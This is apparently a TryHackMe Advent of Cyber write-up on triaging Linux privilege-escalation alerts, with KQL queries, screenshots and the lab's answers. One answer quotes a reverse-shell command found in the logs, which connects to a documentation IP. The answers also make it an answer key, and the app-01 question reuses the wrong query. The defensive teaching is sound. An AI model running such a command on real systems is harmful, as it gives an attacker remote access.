![SOC Alert Triaging - Tinsel Triage Banner](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/5dbea226085ab6182a2ee0f7-1762541345941)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Cover.png" alt="SOC Alert Triaging - Tinsel Triage Logo">
</p>

# <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/5dbea226085ab6182a2ee0f7-1761751325593" alt="image" style="vertical-align: middle;height: 50px;" /> SOC Alert Triaging - Tinsel Triage | Advent of Cyber 2025 - Day 10

This guide contains the answer and steps necessary to get to them for the [SOC Alert Triaging - Tinsel Triage](https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2) room.

## Table of contents

- [Investigation Proper](#investigation-proper)
- [Diving Deeper Into Logs](#diving-deeper-into-logs)

### Investigation Proper

1.  How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert?

    It may take a while to get access to the lab environment, so keep that in mind. It took a while for me as well. When you have access, make sure to configure the lab as described in the text.

    For me the incidents and rules wouldn't load. It have tried it multiple times without success. I will try again later, when things quiet down a little.

    It seems they have changed somethings in the room. Instead of joining and configuring a lab. You can log into a setup lab. This seems to work much better.

    Navigating to the incidents tab, we can now see all the incidents. Lets filter them on the "polkit" program. If we open one of these incidents, we can see how many entities these are related to.

    ![Polkit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Polkit.png)

    ![Polkit Events](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Polkit_Events.png)    

    ><details><summary>Click for answer</summary>10</details>

2.  What is the severity of the Linux PrivEsc - Sudo Shadow Access alert?

    For this question we filter the list on "shadow". The first column will give us its severity.

    ![Shadow](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Shadow.png)

    ><details><summary>Click for answer</summary>High</details>

3.  How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert?

    For this answer we can filter the list on "user added". This will give us many events and alerts, so we should look at the affected entities. These however contain not only accounts, but also systems. 

    ![User](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_User.png)

    So we select to view all entities. In the next window we filter the entities list on "account". 

    ![Entities](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Entities.png)

    ><details><summary>Click for answer</summary>4</details>

### Diving Deeper Into Logs

1.  What is the name of the kernel module installed in websrv-01?

    Filter the incidents on "kernel" and select all events in the details tab.

    ![Kernel Events](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Kernel_Events.png)

    Here we can see a few events that list the name of the kernel that was inserted.

    ![Kernel Name](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Kernel_Name.png)

    ><details><summary>Click for answer</summary>malicious_mod.ko</details>

2.  What is the unusual command executed within websrv-01 by the ops user?

    We can change the KQL query to look at events from 'websrv-01'.

    ```cmd
    // The query_now parameter represents the time (in UTC) at which the scheduled analytics rule ran to produce this alert.
    set query_now = datetime(2025-12-12T03:28:52.0545899Z);
    Syslog_CL
    | where host_s == 'websrv-01'
    | project TimeGenerated, host_s, Message
    ```

    ![Kernel Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Kernel_Command.png)

    Here we can see an unusual command being issued.

    ><details><summary>Click for answer</summary>/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1</details>

3.  What is the source IP address of the first successful SSH login to storage-01?

    We will use a different KQL query this time:

    ```cmd
    set query_now = datetime(2025-10-30T05:09:25.9886229Z);
    Syslog_CL
    | where host_s == 'storage-01' and Message has 'sshd'
    | project _timestamp_t, host_s, Message
    ```

    ![Ssh](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Ssh.png)

    There is one entry here with a source IP address.

    ><details><summary>Click for answer</summary>172.16.0.12</details>

4.  What is the external source IP that successfully logged in as root to app-01?

    For this question we will look at events where the host is "app-01" and the message contains "root"


    ```cmd
    set query_now = datetime(2025-10-30T05:09:25.9886229Z);
    Syslog_CL
    | where host_s == 'storage-01' and Message has 'sshd'
    | project _timestamp_t, host_s, Message
    ```

    ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Root.png)

    Here we see two IP addresses of which one is a private IP and the other a public IP.

    ><details><summary>Click for answer</summary>203.0.113.45</details>

5.  Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?

    For this question we change our query to filter events where the message contains "user".

    ```cmd
    set query_now = datetime(2025-10-30T05:09:25.9886229Z);
    Syslog_CL
    | where host_s == 'app-01' and Message has 'user'
    | project _timestamp_t, host_s, Message
    ```

    ![Polkit Sudoers](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/azuresentinel-aoc2025-a7d3h9k0p2/SOC_Alert_Triaging_-_Tinsel_Triage_Polkit_Sudoers.png)

    ><details><summary>Click for answer</summary>deploy</details>
